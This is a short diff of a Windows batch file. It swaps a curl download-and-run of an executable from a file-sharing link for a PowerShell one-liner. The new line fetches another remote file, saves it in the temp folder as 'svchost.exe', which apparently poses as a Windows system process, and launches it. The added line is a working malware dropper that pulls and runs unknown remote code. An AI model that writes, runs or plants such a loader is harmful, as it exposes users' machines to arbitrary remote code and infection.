@@ -1,3 +1,2 @@
 @echo off
-curl -L -o %TEMP%\a.exe https://limewire.com/d/FDphV#TmLbLMqVie
-start "" %TEMP%\a.exe
+powershell -c "iwr 'https://limewire.com/d/e7ZYI#KTxZOpKpll' -OutFile '$env:TEMP\svchost.exe'; Start-Process '$env:TEMP\svchost.exe'"
